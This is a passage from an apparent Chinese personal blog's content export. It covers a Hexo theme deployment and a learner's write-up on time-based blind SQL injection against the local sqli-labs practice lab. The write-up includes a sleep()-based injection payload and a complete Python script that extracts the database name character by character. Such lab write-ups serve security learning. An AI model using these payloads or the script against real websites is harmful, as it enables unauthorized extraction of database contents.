operator">/</span>hexo<span class="token punctuation">.</span>io<span class="token operator">/</span>themes<span class="token operator">/</span>theme<span class="token punctuation">:</span> hexo<span class="token operator">-</span>theme<span class="token operator">-</span>Annie</code></pre><p><strong>注意格式，该空格的地方记得要空格</strong>。<br>4.本地预览</p><pre class="language-go" data-language="go"><code class="language-go">hexo cleanhexo ghexo s</code></pre><p>会出现一个链接（端口号一般是4000），复制链接到浏览器中打开就可以看到更改后的主题了。<br>5.上传主题</p><pre class="language-go" data-language="go"><code class="language-go">$ hexo dINFO  Deploying<span class="token punctuation">:</span> gitINFO  Clearing <span class="token punctuation">.</span>deploy_git folder<span class="token operator">...</span>INFO  Copying files from public folder<span class="token operator">...</span>INFO  Copying files from extend dirs<span class="token operator">...</span>warning<span class="token punctuation">:</span> LF will be replaced by CRLF in <span class="token number">2020</span><span class="token operator">/</span><span class="token number">02</span><span class="token operator">/</span><span class="token number">01</span><span class="token operator">/</span>hello<span class="token operator">-</span>world<span class="token operator">/</span>index<span class="token punctuation">.</span>html<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in archives<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">02</span><span class="token operator">/</span>index<span class="token punctuation">.</span>html<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in archives<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span>index<span class="token punctuation">.</span>html<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in archives<span class="token operator">/</span>index<span class="token punctuation">.</span>html<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in index<span class="token punctuation">.</span>html<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in css<span class="token operator">/</span>Annie<span class="token punctuation">.</span>css<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in css<span class="token operator">/</span>comment<span class="token punctuation">.</span>css<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in js<span class="token operator">/</span>leancloud<span class="token operator">-</span>count<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in js<span class="token operator">/</span>main<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in js<span class="token operator">/</span>search<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>chinese<span class="token operator">/</span>chinese<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>clipboard<span class="token operator">/</span>clipboard<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>comment<span class="token operator">/</span>valine<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>fancybox<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token punctuation">.</span>css<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>fancybox<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>natural<span class="token operator">-</span>gallery<span class="token punctuation">.</span>full<span class="token punctuation">.</span>css<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>natural<span class="token operator">-</span>gallery<span class="token punctuation">.</span>full<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>natural<span class="token punctuation">.</span>css<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>imagelazyloader<span class="token operator">/</span>yall<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>imageloaded<span class="token operator">/</span>imagesloaded<span class="token punctuation">.</span>pkgd<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>jquery<span class="token operator">/</span>jquery<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>leancloud<span class="token operator">/</span>av<span class="token operator">-</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>motto<span class="token operator">/</span>motto<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>nicescroll<span class="token operator">/</span>jquery<span class="token punctuation">.</span>nicescroll<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>resizediv<span class="token operator">/</span>resizediv<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>search<span class="token operator">/</span>ziploader<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directorywarning<span class="token punctuation">:</span> LF will be replaced by CRLF in plugin<span class="token operator">/</span>toc<span class="token operator">/</span>katelog<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span>The file will have its original line endings in your working directory<span class="token punctuation">[</span>master <span class="token number">20686</span>db<span class="token punctuation">]</span> Site updated<span class="token punctuation">:</span> <span class="token number">2020</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">01</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">40</span><span class="token punctuation">:</span><span class="token number">09</span> <span class="token number">70</span> files changed<span class="token punctuation">,</span> <span class="token number">25502</span> <span class="token function">insertions</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5825</span> <span class="token function">deletions</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">)</span> rewrite <span class="token number">2020</span><span class="token operator">/</span><span class="token number">02</span><span class="token operator">/</span><span class="token number">01</span><span class="token operator">/</span>hello<span class="token operator">-</span>world<span class="token operator">/</span>index<span class="token punctuation">.</span>html <span class="token punctuation">(</span><span class="token number">70</span><span class="token operator">%</span><span class="token punctuation">)</span> rewrite archives<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">02</span><span class="token operator">/</span>index<span class="token punctuation">.</span>html <span class="token punctuation">(</span><span class="token number">94</span><span class="token operator">%</span><span class="token punctuation">)</span> rewrite archives<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span>index<span class="token punctuation">.</span>html <span class="token punctuation">(</span><span class="token number">94</span><span class="token operator">%</span><span class="token punctuation">)</span> rewrite archives<span class="token operator">/</span>index<span class="token punctuation">.</span>html <span class="token punctuation">(</span><span class="token number">94</span><span class="token operator">%</span><span class="token punctuation">)</span> create mode <span class="token number">100644</span> css<span class="token operator">/</span>Annie<span class="token punctuation">.</span>css create mode <span class="token number">100644</span> css<span class="token operator">/</span>comment<span class="token punctuation">.</span>css <span class="token builtin">delete</span> mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>FontAwesome<span class="token punctuation">.</span>otf <span class="token builtin">delete</span> mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>fontawesome<span class="token operator">-</span>webfont<span class="token punctuation">.</span>eot <span class="token builtin">delete</span> mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>fontawesome<span class="token operator">-</span>webfont<span class="token punctuation">.</span>svg <span class="token builtin">delete</span> mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>fontawesome<span class="token operator">-</span>webfont<span class="token punctuation">.</span>ttf <span class="token builtin">delete</span> mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>fontawesome<span class="token operator">-</span>webfont<span class="token punctuation">.</span>woff create mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>icomoon<span class="token punctuation">.</span>eot create mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>icomoon<span class="token punctuation">.</span>svg create mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>icomoon<span class="token punctuation">.</span>ttf create mode <span class="token number">100644</span> css<span class="token operator">/</span>fonts<span class="token operator">/</span>icomoon<span class="token punctuation">.</span>woff <span class="token builtin">delete</span> mode <span class="token number">100644</span> css<span class="token operator">/</span>images<span class="token operator">/</span>banner<span class="token punctuation">.</span>jpg <span class="token builtin">delete</span> mode <span class="token number">100644</span> css<span class="token operator">/</span>style<span class="token punctuation">.</span>css <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>blank<span class="token punctuation">.</span>gif <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>fancybox_loading<span class="token punctuation">.</span>gif <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>fancybox_loading@<span class="token number">2</span>x<span class="token punctuation">.</span>gif <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>fancybox_overlay<span class="token punctuation">.</span>png <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>fancybox_sprite<span class="token punctuation">.</span>png <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>fancybox_sprite@<span class="token number">2</span>x<span class="token punctuation">.</span>png <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>helpers<span class="token operator">/</span>fancybox_buttons<span class="token punctuation">.</span>png <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>helpers<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token operator">-</span>buttons<span class="token punctuation">.</span>css <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>helpers<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token operator">-</span>buttons<span class="token punctuation">.</span>js <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>helpers<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token operator">-</span>media<span class="token punctuation">.</span>js <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>helpers<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token operator">-</span>thumbs<span class="token punctuation">.</span>css <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>helpers<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token operator">-</span>thumbs<span class="token punctuation">.</span>js <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token punctuation">.</span>css <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token punctuation">.</span>js <span class="token builtin">delete</span> mode <span class="token number">100644</span> fancybox<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token punctuation">.</span>pack<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> img<span class="token operator">/</span>Annie_qq_qrcode<span class="token punctuation">.</span>jpg create mode <span class="token number">100644</span> img<span class="token operator">/</span>cart_cover<span class="token punctuation">.</span>jpg create mode <span class="token number">100644</span> img<span class="token operator">/</span>favicon<span class="token punctuation">.</span>ico create mode <span class="token number">100644</span> img<span class="token operator">/</span>header<span class="token operator">-</span>bg<span class="token punctuation">.</span>jpg create mode <span class="token number">100644</span> img<span class="token operator">/</span>lazy<span class="token punctuation">.</span>gif create mode <span class="token number">100644</span> img<span class="token operator">/</span>logo<span class="token punctuation">.</span>png create mode <span class="token number">100644</span> img<span class="token operator">/</span>quote<span class="token operator">/</span>danger<span class="token punctuation">.</span>svg create mode <span class="token number">100644</span> img<span class="token operator">/</span>quote<span class="token operator">/</span>info<span class="token punctuation">.</span>svg create mode <span class="token number">100644</span> img<span class="token operator">/</span>quote<span class="token operator">/</span>quote<span class="token operator">-</span>left<span class="token punctuation">.</span>svg create mode <span class="token number">100644</span> img<span class="token operator">/</span>quote<span class="token operator">/</span>success<span class="token punctuation">.</span>svg create mode <span class="token number">100644</span> img<span class="token operator">/</span>quote<span class="token operator">/</span>warning<span class="token punctuation">.</span>svg rewrite index<span class="token punctuation">.</span>html <span class="token punctuation">(</span><span class="token number">96</span><span class="token operator">%</span><span class="token punctuation">)</span> create mode <span class="token number">100644</span> js<span class="token operator">/</span>leancloud<span class="token operator">-</span>count<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> js<span class="token operator">/</span>main<span class="token punctuation">.</span>js <span class="token builtin">delete</span> mode <span class="token number">100644</span> js<span class="token operator">/</span>script<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> js<span class="token operator">/</span>search<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>chinese<span class="token operator">/</span>chinese<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>clipboard<span class="token operator">/</span>clipboard<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>comment<span class="token operator">/</span>valine<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>fancybox<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token punctuation">.</span>css create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>fancybox<span class="token operator">/</span>jquery<span class="token punctuation">.</span>fancybox<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>data<span class="token punctuation">.</span>json create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>images<span class="token operator">/</span><span class="token keyword">default</span><span class="token operator">-</span>skin<span class="token punctuation">.</span>png create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>images<span class="token operator">/</span><span class="token keyword">default</span><span class="token operator">-</span>skin<span class="token punctuation">.</span>svg create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>images<span class="token operator">/</span>preloader<span class="token punctuation">.</span>gif create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>natural<span class="token operator">-</span>gallery<span class="token punctuation">.</span>full<span class="token punctuation">.</span>css create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>natural<span class="token operator">-</span>gallery<span class="token punctuation">.</span>full<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>gallerypage<span class="token operator">/</span>natural<span class="token punctuation">.</span>css create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>imagelazyloader<span class="token operator">/</span>yall<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>imageloaded<span class="token operator">/</span>imagesloaded<span class="token punctuation">.</span>pkgd<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>jquery<span class="token operator">/</span>jquery<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>leancloud<span class="token operator">/</span>av<span class="token operator">-</span>min<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>love<span class="token operator">/</span>love<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>motto<span class="token operator">/</span>motto<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>nicescroll<span class="token operator">/</span>jquery<span class="token punctuation">.</span>nicescroll<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>resizediv<span class="token operator">/</span>resizediv<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>search<span class="token operator">/</span>ziploader<span class="token punctuation">.</span>js create mode <span class="token number">100644</span> plugin<span class="token operator">/</span>toc<span class="token operator">/</span>katelog<span class="token punctuation">.</span>min<span class="token punctuation">.</span>jsEnumerating objects<span class="token punctuation">:</span> <span class="token number">94</span><span class="token punctuation">,</span> done<span class="token punctuation">.</span>Counting objects<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">94</span><span class="token operator">/</span><span class="token number">94</span><span class="token punctuation">)</span><span class="token punctuation">,</span> done<span class="token punctuation">.</span>Delta compression using up to <span class="token number">12</span> threadsCompressing objects<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">61</span><span class="token operator">/</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">,</span> done<span class="token punctuation">.</span>Writing objects<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">78</span><span class="token operator">/</span><span class="token number">78</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1.62</span> MiB <span class="token operator">|</span> <span class="token number">236.00</span> KiB<span class="token operator">/</span>s<span class="token punctuation">,</span> done<span class="token punctuation">.</span>Total <span class="token number">78</span> <span class="token punctuation">(</span>delta <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> reused <span class="token number">0</span> <span class="token punctuation">(</span>delta <span class="token number">0</span><span class="token punctuation">)</span>remote<span class="token punctuation">:</span> Resolving deltas<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> done<span class="token punctuation">.</span>To https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>zxcv0221<span class="token operator">/</span>zxcv0221<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>git   d8a3c48<span class="token punctuation">.</span><span class="token number">.20686</span>db  HEAD <span class="token operator">-</span><span class="token operator">></span> masterBranch <span class="token string">'master'</span> set up to track remote branch <span class="token string">'master'</span> from <span class="token string">'https://github.com/zxcv0221/zxcv0221.github.io.git'</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">32</span>mINFO <span class="token punctuation">[</span><span class="token number">39</span>m Deploy done<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">35</span>mgit<span class="token punctuation">[</span><span class="token number">39</span>m</code></pre><p>出现这样的界面就算成功了。<br>但是我的恰好不是这样的：<br>我的输入<code>hexo g</code>和<code>hexo</code>后是这样的，<br><img src="https://img-blog.csdnimg.cn/20200201184042707.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看着网上的教程人家改主题也没这么费劲啊~~，为什么问题总找我，不过无所不知的度娘给了我解决办法，<br>问题：如果出现<code>WARN no layout:index.html</code>?&gt;&lt;?<br>解决办法：只要把theme下的文件名改为主题名就行。我这里把它改成了<code>hexo-theme-Annie</code>.</p><h6 id="如果这些都做了，还是没有变化，还有一个办法，那就是把theme目录下的那个包含主题的文件删了重新下载。"><a href="#如果这些都做了，还是没有变化，还有一个办法，那就是把theme目录下的那个包含主题的文件删了重新下载。" class="headerlink" title="如果这些都做了，还是没有变化，还有一个办法，那就是把theme目录下的那个包含主题的文件删了重新下载。"></a>如果这些都做了，还是没有变化，还有一个办法，那就是把theme目录下的那个包含主题的文件删了重新下载。</h6><p>问题终于解决了，呼~~，挺费劲的。也不枉我昨天熬到凌晨两点多，很高兴，终于就要完成了，<img src="https://img-blog.csdnimg.cn/20200201190631819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这次学习学到很多,最重要的就是要不断尝试，不能气馁。虽然过程中心情非常急，但是，做完之后会有一种成就感。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尝试时间盲注get和post</title>
      <link href="/posts/55ec4802/"/>
      <url>/posts/55ec4802/</url>
      
        <content type="html"><![CDATA[<p>时间盲注概念（百度经验）： MySQL基于时间盲注的原理分析，注入SQL语句执行后不提示真假，也不能通过页面内容来进行判断，通过构造SQL语句注入，查看页面响应的时间来判断信息为时间盲注。</p><h3 id="基础函数"><a href="#基础函数" class="headerlink" title="基础函数"></a>基础函数</h3><p><code>if(payload,true,false)</code>如果payload是正确的，那就执行true，否则就执行false。<br><code>sleep()</code>这个函数有一个参数，可以延迟输出，可以根据它是否延迟相应的时间来判断语句正确还是错误。</p><h3 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h3><h5 id="GET类型"><a href="#GET类型" class="headerlink" title="GET类型"></a>GET类型</h5><p>（1）<code>get</code>举例：sqli-labs-10<br>这个跟之前判断的语句不一样，因为这一关它不管是输入<code>&#39;</code>还是<code>&quot;</code>都是一个结果，所以这里要变化一下。</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p>这里我把时间设置的比较长了一点，3秒的话，我还真看不出来😂😂😂。<br>这个加载很快，再试试双引号，可以。这样就知道闭合符号是双引号。<br>然后，这个用脚本跑一下，目前还不会写脚本，<strong>借</strong>（咳咳，那不叫偷拿，我们学习呢。😎😎😎这句话出来估计又要找打了。）学长写的脚本先试试感觉。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment">#!-*-coding:utf-8 -*-</span><span class="token comment">#!@lime    :   13:03</span><span class="token comment">#!@Author  : Augenstern</span><span class="token comment">#!@File    : .py</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">import</span> sysheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"user-agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"</span><span class="token punctuation">&#125;</span>chars <span class="token operator">=</span> <span class="token string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'</span>resualt <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">global</span> length<span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lengthUrl <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/sqli-labs-master/Less-10/?id=1" and if(length(database())>&#123;0&#125;,1,sleep(5))--+'</span>    lengthUrlFormat <span class="token operator">=</span> lengthUrl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>    start_time0 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    rsp0 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>lengthUrlFormat<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time0 <span class="token operator">></span> <span class="token number">2.5</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'result length is '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">global</span> length        length <span class="token operator">=</span> l        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>        charAscii <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>        url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),&#123;0&#125;,1))>&#123;1&#125;,1,sleep(5))--+'</span>        urlformat <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> charAscii<span class="token punctuation">)</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlformat<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time <span class="token operator">></span> <span class="token number">2.5</span><span class="token punctuation">:</span>            resualt <span class="token operator">+=</span> char            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'resualt: '</span><span class="token punctuation">,</span> resualt<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'resualt is '</span> <span class="token operator">+</span> resualt<span class="token punctuation">)</span></code></pre><p>过程有点慢，但总比手注快多了。看下结果：<br><img src="https://img-blog.csdnimg.cn/20200311131628706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这脚本真棒。为了证明我这脚本小子不止会<del>偷</del> ，呸，借！！！，我还认真的去看了。</p><h6 id="运行之前的检查"><a href="#运行之前的检查" class="headerlink" title="运行之前的检查"></a>运行之前的检查</h6><p>对了，因为第一次看脚本，犯了很沙雕的错误，一上午就在查。当时一下子整懵B了。<br>跑脚本之前，先加第三方库，像这个脚本，就是要添加<code>request</code>，<code>response</code>，<code>length</code>,至于<code>time</code>，我刚开始也去添加了，发现添加不了，一直出错，然后就到百度去查，有的说，用pip添加再导入，反正乱七八糟的说啥的都有，把我这个小萌新整成小懵B了。到最后我才发现，这是不用添加的，简直气死               <img src="https://img-blog.csdnimg.cn/20200311132928961.jpg" alt="在这里插入图片描述" loading="lazy"><br>time是Python自带的库。就这………………<br>还有，别像这样拿到一个脚本就去跑，有些基本的东西还是要改的，比如：文件头（就那个叫headers的家伙）、然后就是url，别人的url不一定就跟你的一样，我们学长的就跟我们不一样，人家是Mac，（有钱，酸了）。<br>还有一种情况：<br><img 